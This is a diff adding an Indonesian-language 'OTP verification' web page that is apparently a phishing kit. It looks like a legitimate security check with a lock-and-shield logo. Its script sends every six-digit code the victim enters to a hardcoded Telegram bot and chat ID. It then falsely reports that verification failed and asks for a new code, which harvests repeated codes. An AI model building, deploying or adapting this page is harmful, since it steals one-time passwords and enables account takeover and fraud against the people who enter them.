@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi OTP</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+        }
+        
+        .otp-input {
+            width: 2rem !important;
+            height: 2rem;
+            margin: 0 0.5rem;
+            font-size: 1.5rem;
+            text-align: center;
+            border-radius: 0.5rem;
+            border: 2px solid #ddd;
+            transition: all 0.3s;
+        }
+        
+        .otp-input:focus {
+            border-color: #4f46e5;
+            box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.2);
+            outline: none;
+        }
+        
+        .otp-input.filled {
+            border-color: #10b981;
+        }
+        
+        .loader {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #fff;
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+        
+        @keyframes rotation {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="flex items-center justify-center p-4">
+    <div class="w-full max-w-md bg-white rounded-xl shadow-lg overflow-hidden">
+        <div class="p-8">
+            <div class="flex justify-center mb-6">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTFLSQKT46lw3IAo9X7yhVPjegC_uVIfpDWKQ&s" alt="Logo perusahaan keamanan dengan simbol gembok dan perisai" class="h-20" />
+            </div>
+            
+            <h2 class="text-2xl font-bold text-center text-gray-800 mb-2">Verifikasi OTP</h2>
+            <p class="text-gray-600 text-center mb-8">Masukkan kode verifikasi 6 digit yang telah dikirim ke perangkat Anda</p>
+            
+            <form id="otpForm" class="mb-6">
+                <div class="flex justify-center mb-8">
+                    <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" maxlength="1" class="otp-input" data-index="4" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" maxlength="1" class="otp-input" data-index="5" inputmode="numeric" pattern="[0-9]*">
+                    <input type="text" maxlength="1" class="otp-input" data-index="6" inputmode="numeric" pattern="[0-9]*">
+                </div>
+                
+                <input type="hidden" id="fullOtp" name="otp">
+                
+                <button type="submit" id="submitBtn" class="w-full py-3 px-4 bg-indigo-600 hover:bg-indigo-700 text-white font-medium rounded-lg transition duration-200 flex items-center justify-center">
+                    <span id="btnText">Verifikasi</span>
+                    <span id="loader" class="loader hidden"></span>
+                </button>
+            </form>
+            
+            <div class="text-center text-sm text-gray-500">
+                Tidak menerima kode? <a href="#" class="text-indigo-600 font-medium">Kirim ulang</a>
+            </div>
+        </div>
+        
+        <div class="bg-gray-50 px-8 py-4">
+            <p class="text-xs text-gray-500 text-center">Dengan melanjutkan, Anda menyetujui Syarat & Ketentuan dan Kebijakan Privasi kami</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const otpInputs = document.querySelectorAll('.otp-input');
+            const fullOtpInput = document.getElementById('fullOtp');
+            const otpForm = document.getElementById('otpForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const loader = document.getElementById('loader');
+            
+            // Auto-focus to first input
+            otpInputs[0].focus();
+            
+            // Handle OTP input logic
+            otpInputs.forEach(input => {
+                input.addEventListener('input', function(e) {
+                    const value = e.target.value;
+                    const index = parseInt(e.target.getAttribute('data-index'));
+                    
+                    // Auto move to next input
+                    if (value.length === 1 && index < 6) {
+                        otpInputs[index].focus();
+                    }
+                    
+                    // Add filled class for visual feedback
+                    if (value.length === 1) {
+                        e.target.classList.add('filled');
+                    } else {
+                        e.target.classList.remove('filled');
+                    }
+                    
+                    updateFullOtp();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && e.target.value.length === 0 && e.target.getAttribute('data-index') > 1) {
+                        otpInputs[parseInt(e.target.getAttribute('data-index')) - 2].focus();
+                    }
+                });
+            });
+            
+            function updateFullOtp() {
+                let otp = '';
+                otpInputs.forEach(input => {
+                    otp += input.value;
+                });
+                fullOtpInput.value = otp;
+            }
+            
+            // Form submission
+            otpForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const otp = fullOtpInput.value;
+                
+                if (otp.length !== 6) {
+                    alert('Harap masukkan kode OTP 6 digit lengkap');
+                    return;
+                }
+                
+                // Show loading state
+                submitBtn.disabled = true;
+                btnText.textContent = 'Memverifikasi...';
+                loader.classList.remove('hidden');
+                
+                // Send OTP to Telegram
+                sendToTelegram(otp);
+            });
+            
+            function sendToTelegram(otp) {
+                // Replace with your Telegram bot token and chat ID
+                const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+                const chatId = '7549590022';
+                const message = `OTP Baru: ${otp}\nWaktu: ${new Date().toLocaleString()}\nIP: ${window.location.hostname}`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
+                    alert('OTP Gagal diverifikasi Masukkan OTP Baru!');
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('Terjadi kesalahan saat mengirim OTP. Silakan coba lagi.');
+                })
+                .finally(() => {
+                    // Reset form
+                    submitBtn.disabled = false;
+                    btnText.textContent = 'Verifikasi';
+                    loader.classList.add('hidden');
+                    
+                    // Optional: Clear OTP inputs after submission
+                    otpInputs.forEach(input => {
+                        input.value = '';
+                        input.classList.remove('filled');
+                    });
+                    fullOtpInput.value = '';
+                    otpInputs[0].focus();
+                });
+            }
+        });
+    </script>
+</body>
+</html>
